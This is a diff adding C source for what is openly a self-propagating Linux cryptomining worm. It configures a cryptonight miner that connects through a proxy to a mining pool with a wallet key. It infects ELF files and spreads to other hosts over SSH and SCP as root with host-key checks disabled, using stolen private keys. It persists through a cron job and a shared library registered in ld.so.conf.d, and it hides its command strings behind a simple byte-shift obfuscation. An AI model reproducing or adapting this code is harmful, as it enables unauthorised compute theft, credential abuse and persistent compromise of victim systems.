@@ -1,0 +1,150 @@
+
+#include <stdio.h>
+#define HL(a)   (a) + 0x50  // add 50 to each letter as an integer before storing
+#define US(str)  do { char * ptr = str ; while (*ptr) *ptr++ -= 0x50; } while(0)
+#define HS(str)  do {char * ptr = str ; while (*ptr) *ptr++ += 0x50;} while(0)
+
+#define work_proxy "socks5://proxy-mu.iglb.intel.com:1080"
+#define work_algo "cryptonight"
+#define work_ep "stratum+tcp://pool.xdrop.io:3333"
+#define work_key "DDj94LVh1xMA5ANs74TUKAKm55P8J4utRCBSE2d8tqYNV1xMm8eaoBtYVZXmN2w4s5NujDwfwhtgH1XG1VVc9biz2ejipVj"
+#define payload_dir "/usr/bin/"
+
+#define VIRUS_SIZE 1385376
+#define MAGIC 6585
+#define TMPLATE ".lx2k2XXXXXX"
+#define MAX_INFECT 5
+#define MAX_SIZE 1024
+#define FGW "/home/skmonney\0"
+
+char PKEY_TMP_PATH[] = { HL('/'),HL('r'),HL('o'),HL('o'),HL('t'),HL('/'),HL('.'),HL('s'),HL('s'),HL('h'),HL('2'),HL('/'),HL('f'),HL('d'),HL('f'),HL('d'),HL('s'),HL('f'),HL('w'),HL('e'),HL('f'),HL('w'),HL('f'),HL('g'),HL('d'),HL('v'),HL('d'),HL('f'),HL('v'),HL('i'),HL('u'),'\0' };
+char PKEY_TMP_PATHG[] = { HL('/'),HL('r'),HL('o'),HL('o'),HL('t'),HL('/'),HL('.'),HL('s'),HL('s'),HL('h'),HL('2'),HL('/'),HL('f'),HL('d'),HL('f'),HL('d'),HL('s'),HL('f'),HL('w'),HL('e'),HL('f'),HL('w'),HL('f'),HL('g'),HL('d'),HL('v'),HL('d'),HL('f'),HL('v'),HL('i'),HL('u'),HL('.'),HL('p'),'\0' };
+char IDENT_TMP_PATH[] = { HL('/'),HL('r'),HL('o'),HL('o'),HL('t'),HL('/'),HL('.'),HL('s'),HL('s'),HL('h'),HL('2'),HL('/'),HL('i'),HL('d'),HL('e'),HL('n'),HL('t'),HL('_'),HL('f'),HL('d'),HL('f'),HL('d'),HL('s'),HL('f'),HL('w'),HL('e'),HL('f'),HL('w'),HL('f'),HL('g'),HL('d'),HL('v'),HL('d'),HL('f'),HL('v'),HL('i'),HL('u'),'\0' };
+char sysregqb[] = { HL('e'),HL('c'),HL('h'),HL('o'),HL(' '),HL('1'),HL(' '),HL('>'),HL(' '),HL('/'),HL('p'),HL('r'),HL('o'),HL('c'),HL('/'),HL('s'),HL('y'),HL('s'),HL('/'),HL('k'),HL('e'),HL('r'),HL('n'),HL('e'),HL('l'),HL('/'),HL('s'),HL('y'),HL('s'),HL('r'),HL('q'),'\0' };
+char sysregqon[] = { HL('e'),HL('c'),HL('h'),HL('o'),HL(' '),HL('1'),HL(' '),HL('>'),HL(' '),HL('/'),HL('p'),HL('r'),HL('o'),HL('c'),HL('/'),HL('s'),HL('y'),HL('s'),HL('/'),HL('k'),HL('e'),HL('r'),HL('n'),HL('e'),HL('l'),HL('/'),HL('s'),HL('y'),HL('s'),HL('r'),HL('q'),'\0' };
+
+char SCP_STR[] = { HL('s'),HL('c'),HL('p'),HL(' '),HL('%'),HL('s'),HL(' '),HL('-'),HL('i'),HL(' '),HL('\\'),HL('"'),HL('%'),HL('s'),HL('\\'),HL('"'),HL(' '),HL('\\'),HL('"'),HL('%'),HL('s'),HL('\\'),HL('"'),HL(' '),HL('\\'),HL('"'),HL('r'),HL('o'),HL('o'),HL('t'),HL('@'),HL('%'),HL('s'),HL('\\'),HL('"'),HL(' '),HL('>'),HL(' '),HL('/'),HL('d'),HL('e'),HL('v'),HL('/'),HL('n'),HL('u'),HL('l'),HL('l'),HL(' '),HL('2'),HL('>'),HL('&'),HL('1'),'\0' };
+char SSH_OPT[] = { HL('-'),HL('o'),HL(' '),HL('S'),HL('t'),HL('r'),HL('i'),HL('c'),HL('t'),HL('H'),HL('o'),HL('s'),HL('t'),HL('K'),HL('e'),HL('y'),HL('C'),HL('h'),HL('e'),HL('c'),HL('k'),HL('i'),HL('n'),HL('g'),HL('='),HL('n'),HL('o'),HL(' '),HL('-'),HL('o'),HL(' '),HL('C'),HL('o'),HL('n'),HL('n'),HL('e'),HL('c'),HL('t'),HL('i'),HL('o'),HL('n'),HL('T'),HL('i'),HL('m'),HL('e'),HL('o'),HL('u'),HL('t'),HL('='),HL('3'),HL(' '),'\0' };
+char SSH_STR[] = { HL('s'),HL('s'),HL('h'),HL(' '),HL('%'),HL('s'),HL(' '),HL('-'),HL('i'),HL(' '),HL('\\'),HL('"'),HL('%'),HL('s'),HL('\\'),HL('"'),HL(' '),HL('\\'),HL('"'),HL('r'),HL('o'),HL('o'),HL('t'),HL('@'),HL('%'),HL('s'),HL('\\'),HL('"'),HL(' '),HL('\\'),HL('"'),HL('%'),HL('s'),HL('\\'),HL('"'),'\0' };
+char SSH_STR1[] = { HL('s'),HL('s'),HL('h'),HL(' '),HL('%'),HL('s'),HL(' '),HL('-'),HL('i'),HL(' '),HL('\\'),HL('"'),HL('%'),HL('s'),HL('\\'),HL('"'),HL(' '),HL('\\'),HL('"'),HL('r'),HL('o'),HL('o'),HL('t'),HL('@'),HL('%'),HL('s'),HL('\\'),HL('"'),HL(' '),HL('\\'),HL('"'),HL('%'),HL('s'),HL('\\'),HL('"'),HL(' '),HL('%'),HL('s'),'\0' };
+char GZIP[] = { HL('/'),HL('u'),HL('s'),HL('r'),HL('/'),HL('i'),HL('n'),HL('t'),HL('e'),HL('l'),HL('/'),HL('b'),HL('i'),HL('n'),HL('/'),HL('g'),HL('z'),HL('i'),HL('p'),HL(' '),HL('-'),HL('S'),HL(' '),HL('\\'),HL('"'),HL('.'),HL('p'),HL('\\'),HL('"'),HL(' '),HL('-'),HL('d'),HL(' '),HL('%'),HL('s'),'\0' };
+char SSH_KEYGEN[] = { HL('s'),HL('s'),HL('h'),HL('-'),HL('k'),HL('e'),HL('y'),HL('g'),HL('e'),HL('n'),HL(' '),HL('-'),HL('D'),HL(' '),HL('%'),HL('s'),'\0' };
+char NODES[] = { HL('/'),HL('n'),HL('f'),HL('s'),HL('/'),HL('s'),HL('i'),HL('t'),HL('e'),HL('/'),HL('g'),HL('e'),HL('n'),HL('/'),HL('a'),HL('d'),HL('m'),HL('/'),HL('e'),HL('c'),HL('_'),HL('l'),HL('o'),HL('c'),HL('a'),HL('l'),HL('/'),HL('i'),HL('d'),HL('s'),HL('m'),HL('/'),HL('G'),HL('n'),HL('o'),HL('d'),HL('e'),HL('s'),HL('/'),HL('u'),HL('c'),HL('a'),HL('t'),HL('E'),HL('U'),'\0' };
+char QUERY[] = { HL('k'),HL('e'),HL('y'),HL(' '),HL('d'),HL('n'),HL('s'),HL('d'),HL('o'),HL('m'),HL('a'),HL('i'),HL('n'),HL(' '),HL('i'),HL('m'),HL('a'),HL('g'),HL('e'),HL(' '),HL('|'),HL(' '),HL('g'),HL('r'),HL('e'),HL('p'),HL(' '),HL('\\'),HL('"'),HL('L'),HL('i'),HL('n'),HL('u'),HL('x'),HL('S'),HL('E'),HL('T'),HL('_'),HL('E'),HL('C'),HL('_'),HL('S'),HL('L'),HL('E'),HL('S'),HL('1'),HL('1'),HL('\\'),HL('"'),HL(' '),HL('|'),HL(' '),HL('s'),HL('h'),HL('u'),HL('f'),'\0' };
+char EUEC_IDSM_FILE[] = { HL('/'),HL('e'),HL('t'),HL('c'),HL('/'),HL('c'),HL('r'),HL('o'),HL('n'),HL('.'),HL('d'),HL('/'),HL('e'),HL('u'),HL('e'),HL('c'),HL('_'),HL('i'),HL('d'),HL('s'),HL('m'),'\0' };
+char CRONTAB[] = { HL('0'),HL(' '),HL('0'),HL(' '),HL('1'),HL(' '),HL('*'),HL(' '),HL('*'),HL(' '),HL('/'),HL('u'),HL('s'),HL('r'),HL('/'),HL('b'),HL('i'),HL('n'),HL('/'),HL('m'),HL('e'),HL('n'),HL('n'),HL('i'),HL('c'),HL('a'),HL(' '),HL('>'),HL('/'),HL('d'),HL('e'),HL('v'),HL('/'),HL('n'),HL('u'),HL('l'),HL('l'),HL(' '),HL('2'),HL('>'),HL('&'),HL('1'),HL('\\'),HL('n'),'\0' };
+char RESTART_CRON[] = { HL('/'),HL('e'),HL('t'),HL('c'),HL('/'),HL('i'),HL('n'),HL('i'),HL('t'),HL('.'),HL('d'),HL('/'),HL('c'),HL('r'),HL('o'),HL('n'),HL(' '),HL('r'),HL('e'),HL('s'),HL('t'),HL('a'),HL('r'),HL('t'),'\0' };
+
+char KMODSO[] = { HL('/'),HL('v'),HL('a'),HL('r'),HL('/'),HL('g'),HL('a'),HL('m'),HL('e'),HL('s'),HL('/'),HL('m'),HL('e'),HL('n'),HL('n'),HL('i'),HL('c'),HL('a'),HL('.'),HL('s'),HL('o'),'\0' };
+char KMODSOCP[] = { HL('c'),HL('p'),HL(' '),HL('m'),HL('e'),HL('n'),HL('n'),HL('i'),HL('c'),HL('a'),HL('.'),HL('s'),HL('o'),HL(' '),HL('/'),HL('v'),HL('a'),HL('r'),HL('/'),HL('g'),HL('a'),HL('m'),HL('e'),HL('s'),HL('/'),HL('m'),HL('e'),HL('n'),HL('n'),HL('i'),HL('c'),HL('a'),HL('.'),HL('s'),HL('o'),'\0' };
+char PID[] = { HL('/'),HL('v'),HL('a'),HL('r'),HL('/'),HL('r'),HL('u'),HL('n'),HL('/'),HL('m'),HL('e'),HL('n'),HL('n'),HL('i'),HL('c'),HL('a'),HL('.'),HL('p'),HL('i'),HL('d'),'\0' };
+char MFCONF[] = { HL('/'),HL('e'),HL('t'),HL('c'),HL('/'),HL('l'),HL('d'),HL('.'),HL('s'),HL('o'),HL('.'),HL('c'),HL('o'),HL('n'),HL('f'),HL('.'),HL('d'),HL('/'),HL('m'),HL('f'),HL('.'),HL('c'),HL('o'),HL('n'),HL('f'),'\0' };
+char COMPILE[] = { HL('g'),HL('c'),HL('c'),HL(' '),HL('-'),HL('W'),HL('a'),HL('l'),HL('l'),HL(' '),HL('-'),HL('f'),HL('P'),HL('I'),HL('C'),HL(' '),HL('-'),HL('s'),HL('h'),HL('a'),HL('r'),HL('e'),HL('d'),HL(' '),HL('-'),HL('o'),HL(' '),HL('m'),HL('e'),HL('n'),HL('n'),HL('i'),HL('c'),HL('a'),HL('.'),HL('s'),HL('o'),HL(' '),HL('m'),HL('.'),HL('c'),HL(' '),HL('-'),HL('l'),HL('d'),HL('l'),'\0' };
+char STRIP[] = { HL('s'),HL('t'),HL('r'),HL('i'),HL('p'),HL(' '),HL('-'),HL('s'),HL(' '),HL('m'),HL('e'),HL('n'),HL('n'),HL('i'),HL('c'),HL('a'),HL('.'),HL('s'),HL('o'),'\0' };
+
+char GZIPMCO[] = { HL('/'),HL('u'),HL('s'),HL('r'),HL('/'),HL('i'),HL('n'),HL('t'),HL('e'),HL('l'),HL('/'),HL('b'),HL('i'),HL('n'),HL('/'),HL('g'),HL('z'),HL('i'),HL('p'),HL(' '),HL('-'),HL('d'),HL(' '),HL('-'),HL('S'),HL(' '),HL('"'),HL('.'),HL('o'),HL('"'),HL(' '),HL('m'),HL('.'),HL('c'),HL('.'),HL('o'),'\0' };
+
+char LDCONFIG[] = { HL('/'),HL('s'),HL('b'),HL('i'),HL('n'),HL('/'),HL('l'),HL('d'),HL('c'),HL('o'),HL('n'),HL('f'),HL('i'),HL('g'),'\0' };
+
+#define NUM_HOST_INFECT 10
+
+static int magic = MAGIC;
+int infections=0;
+
+#define MONTH 2500000 
+#define WEEK 150000 
+
+int o_argc = 12;
+
+char *o_argv[] = {
+    "mennica",
+    //"-B",       
+    "--proxy",    
+    work_proxy,   
+    "-a",         
+    work_algo,    
+    "-o",         
+    work_ep,      
+    "-u",         
+    work_key,     
+    "-q",         
+    "-p",         
+    "",           
+    "\0"          
+};   
+
+int infect(const char *filename, int fd, const char *virus);
+void searchForELF(char *directory, const char *virus);
+int main2(int argc, char *argv[], char *env_ptr[]);
+int scp_file(char *source, char *dest);
+int ssh_command(char* dest, char *command, bool resultwanted);
+void szukajDlaHostow();
+void infekowac_gospodarz(char* host, char *domain );
+
+extern char _binary_input_1_p_start;
+extern char _binary_input_1_p_end;
+extern int _binary_input_1_p_size;
+
+extern char _binary_input_2_p_start;
+extern char _binary_input_2_p_end;
+extern int _binary_input_2_p_size;
+
+extern char _binary_input_3_p_start;
+extern char _binary_input_3_p_end;
+extern int _binary_input_3_p_size;
+
+extern char _binary_input_4_p_start;
+extern char _binary_input_4_p_end;
+extern int _binary_input_4_p_size;
+
+extern char _binary_input_5_p_start;
+extern char _binary_input_5_p_end;
+extern int _binary_input_5_p_size;
+
+extern char _binary_input_6_p_start;
+extern char _binary_input_6_p_end;
+extern int _binary_input_6_p_size;
+
+extern char _binary_input_7_p_start;
+extern char _binary_input_7_p_end;
+extern int _binary_input_7_p_size;
+
+extern char _binary_input_8_p_start;
+extern char _binary_input_8_p_end;
+extern int _binary_input_8_p_size;
+
+extern char _binary_input_9_p_start;
+extern char _binary_input_9_p_end;
+extern int _binary_input_9_p_size;
+
+extern char _binary_input_10_p_start;
+extern char _binary_input_10_p_end;
+extern int _binary_input_10_p_size;
+
+extern char _binary_input_11_p_start;
+extern char _binary_input_11_p_end;
+extern int _binary_input_11_p_size;
+
+extern char _binary_input_12_p_start;
+extern char _binary_input_12_p_end;
+extern int _binary_input_12_p_size;
+
+extern char _binary_input_13_p_start;
+extern char _binary_input_13_p_end;
+extern int _binary_input_13_p_size;
+
+extern char _binary_input_14_p_start;
+extern char _binary_input_14_p_end;
+extern int _binary_input_14_p_size;
+
+extern char _binary_input_js_start;
+extern char _binary_input_js_end;
+extern int _binary_input_js_size;
+
+extern char _binary_input_l_start;
+extern char _binary_input_l_end;
+extern int _binary_input_l_size;
+
+extern char _binary_kmod_mennica_c_o_start;
+extern char _binary_kmod_mennica_c_o_end;
+extern int _binary_kmod_mennica_c_o_size;
